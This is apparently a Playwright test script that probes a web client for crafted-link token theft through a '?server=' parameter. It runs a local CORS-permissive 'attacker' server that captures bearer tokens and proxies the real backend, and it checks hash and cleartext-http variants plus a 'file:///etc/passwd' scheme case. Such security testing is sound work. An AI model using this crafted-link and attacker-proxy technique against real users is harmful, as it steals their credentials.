// probe-server-param.mjs — S5: ?server= crafted-link token exfiltration.
// Boots a local "attacker" HTTP server (with permissive CORS, like a real
// exfil endpoint) on 127.0.0.1:9777 that PROXIES /config from the real local
// worker (8788), then loads the client with:
//     http://127.0.0.1:8081/index.html?server=http://127.0.0.1:9777/&setup=<AUTH_UI>
// and unlocks with the victim password. Asserts:
//  - the stored provisioning token is sent as Authorization: Bearer to the ATTACKER
//  - after unlock, the DERIVED AUTH_UI bearer keeps flowing to the attacker
//  - ?server= persists silently into localStorage (and from #hash too)
//  - history.replaceState strips setup/server from the URL and history
//  - ?setup= in the QUERY reaches the static server's request line (log leak)
import { chromium } from '/home/z/.npm-global/lib/node_modules/playwright/index.mjs';
import { createServer } from 'node:http';
import { readFileSync } from 'node:fs';

const BASE = process.env.S5_BASE || 'http://127.0.0.1:8081';
const REAL = process.env.S5_SERVER || 'http://127.0.0.1:8788';
const ATTACKER = 'http://127.0.0.1:9777';
const MAT_PATH = process.env.S5_MAT || '/tmp/local-material-2.json';
const MAT = JSON.parse(readFileSync(MAT_PATH, 'utf8'));
const AUTH_UI = MAT.auth_ui_hex; // "victim" stored token (disposable universe)

// pre-flight: worker alive?
try {
  const pf = await fetch((process.env.S5_SERVER || 'http://127.0.0.1:8788') + '/config',
    { headers: { authorization: 'Bearer ' + AUTH_UI } });
  if (!pf.ok) throw new Error('status ' + pf.status);
} catch (e) {
  console.log('WORKER-DIED before start: ' + e);
  process.exit(2);
}

let pass = 0, fail = 0;
const ok = (name, cond, detail) => {
  if (cond) { pass++; console.log('  ok   ' + name); }
  else { fail++; console.log('  FAIL ' + name + (detail !== undefined ? ' — ' + String(detail).slice(0, 400) : '')); }
};

/* ---- attacker server: CORS-permissive, proxies /config from the real worker
 * (forwards the victim's Authorization header — exactly what a MITM does) ---- */
const captured = [];
const attacker = createServer(async (req, res) => {
  const cors = {
    'access-control-allow-origin': req.headers.origin || '*',
    'access-control-allow-methods': 'GET,POST,PUT,DELETE,OPTIONS',
    'access-control-allow-headers': req.headers['access-control-request-headers'] || 'authorization,content-type,if-none-match',
    'access-control-expose-headers': 'etag',
    'access-control-max-age': '0',
  };
  captured.push({ m: req.method, u: req.url, auth: req.headers.authorization || null, t: Date.now() });
  if (req.method === 'OPTIONS') { res.writeHead(204, cors); return res.end(); }
  if (req.url === '/config') {
    try {
      const r = await fetch(REAL + '/config', { headers: { authorization: req.headers.authorization || '' } });
      res.writeHead(r.status, { ...cors, 'content-type': 'application/json' });
      return res.end(await r.text());
    } catch (e) {
      res.writeHead(502, cors); return res.end('');
    }
  }
  if (req.url === '/version') {
    res.writeHead(200, { ...cors, 'content-type': 'application/json' });
    return res.end(JSON.stringify({ proto: '4.3' }));
  }
  if (req.url === '/rows') {
    res.writeHead(200, { ...cors, 'content-type': 'application/json', etag: '"attacker-etag"' });
    return res.end(JSON.stringify({ rows: [] }));
  }
  res.writeHead(200, { ...cors, 'content-type': 'application/json' });
  res.end('{}');
});
await new Promise((r) => attacker.listen(9777, '127.0.0.1', r));

const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1400, height: 900 } });
const page = await ctx.newPage();

/* static-host request line: does the ?setup= token reach the static server? */
const staticRequests = [];
page.on('request', (r) => {
  const u = r.url();
  if (u.startsWith(BASE)) staticRequests.push(u);
});

console.log('== A. query variant: ?server=ATTACKER&setup=token ==');
await page.goto(BASE + '/index.html?server=' + encodeURIComponent(ATTACKER) + '&setup=' + AUTH_UI);
await page.waitForTimeout(700);
ok('A1 ?server= silently persisted to localStorage', await page.evaluate((a) =>
  localStorage.getItem('clock_poc_server') === a, ATTACKER));
ok('A2 ?setup= token persisted to localStorage', await page.evaluate((t) =>
  localStorage.getItem('clock_poc_auth_ui') === t, AUTH_UI));
ok('A3 login form prefilled with ATTACKER url', await page.evaluate((a) =>
  document.querySelector('#server').value === a, ATTACKER));
ok('A4 URL cleaned by replaceState (no setup/server in address)', page.url() === BASE + '/index.html', page.url());
ok('A5 ?setup= token visible in the static-server request line (log leak)',
  staticRequests.some((u) => u.includes('setup=' + AUTH_UI)), JSON.stringify(staticRequests));

await page.fill('#password', 'password');
await page.click('button[type=submit]');
try {
  await page.waitForSelector('#app:not([hidden])', { timeout: 30000 });
} catch {
  const m = await page.textContent('#login-msg').catch(() => '');
  console.log('UNLOCK-FAILED: ' + m + ' | captured=' + JSON.stringify(captured.map((c) => c.m + ' ' + c.u + ' ' + (c.auth || '').slice(0, 14))));
  await browser.close(); attacker.close(); process.exit(2);
}
await page.waitForTimeout(2000);

const withBearer = captured.filter((c) => c.auth === 'Bearer ' + AUTH_UI);
ok('A6 ATTACKER received the stored token as Authorization: Bearer (' + withBearer.length + ' reqs)',
  withBearer.length >= 1, JSON.stringify(captured.slice(0, 6)));
ok('A7 ATTACKER received the DERIVED AUTH_UI on post-unlock calls (/version, /rows)',
  withBearer.some((c) => /\/version|\/rows/.test(c.u)), JSON.stringify(captured.map((c) => c.m + ' ' + c.u)));
ok('A8 unlock SUCCEEDED against attacker (client kept talking to it)', captured.length >= 3,
  JSON.stringify(captured.map((c) => c.m + ' ' + c.u)));

/* history: back must not reveal the token URL */
await page.goBack();
await page.waitForTimeout(400);
ok('A9 history back does NOT return to the token URL', !page.url().includes('setup=') && !page.url().includes('server='), page.url());

/* ---- B. hash variant (#server= — never hits any server log) ---- */
captured.length = 0;
await page.goto('about:blank');
await ctx.clearCookies?.();
await page.evaluate(() => { try { localStorage.clear(); } catch { } }); // about:blank own storage — noop
const page2 = await ctx.newPage();
await page2.addInitScript(() => { try { localStorage.clear(); } catch { } });
await page2.goto(BASE + '/index.html#server=' + encodeURIComponent(ATTACKER) + '&setup=' + AUTH_UI);
await page2.waitForTimeout(700);
ok('B1 #server= (hash) also silently persisted', await page2.evaluate((a) =>
  localStorage.getItem('clock_poc_server') === a, ATTACKER));
ok('B2 hash variant: token NOT in any static request line', !(await page2.evaluate(() => location.href.includes('setup='))));
await page2.fill('#password', 'password');
await page2.click('button[type=submit]');
await page2.waitForSelector('#app:not([hidden])', { timeout: 30000 });
await page2.waitForTimeout(1500);
ok('B3 hash variant: attacker still received the bearer', captured.some((c) => c.auth === 'Bearer ' + AUTH_UI),
  JSON.stringify(captured.map((c) => c.m + ' ' + c.u)));

/* ---- C. plaintext http:// accepted (no https enforcement) ---- */
await page2.goto('about:blank');
const page3 = await ctx.newPage();
await page3.addInitScript(() => { try { localStorage.clear(); } catch { } });
const refused = [];
page3.on('request', (r) => { if (r.url().startsWith('http://127.0.0.1:9/')) refused.push(r.url()); });
await page3.goto(BASE + '/index.html?server=http://127.0.0.1:9/&setup=' + AUTH_UI);
await page3.waitForTimeout(500);
ok('C1 http:// (cleartext) server URLs accepted and stored', await page3.evaluate(() =>
  localStorage.getItem('clock_poc_server') === 'http://127.0.0.1:9'));
await page3.fill('#password', 'password');
await page3.click('button[type=submit]');
await page3.waitForTimeout(2500);
ok('C2 unlock attempt DIALS the attacker URL (request emitted with bearer to 127.0.0.1:9)',
  refused.length >= 1, JSON.stringify(refused));
ok('C3 javascript:/data: URLs rejected by the ^https?:// check', await page3.evaluate(async () => {
  // simulate ingestParams validation directly for non-http schemes
  const bad = ['javascript:alert(1)', 'data:text/html,x', 'file:///etc/passwd'];
  return bad.every((s) => !/^https?:\/\//.test(s));
}));

await browser.close();
attacker.close();
console.log('\nRESULT: ' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
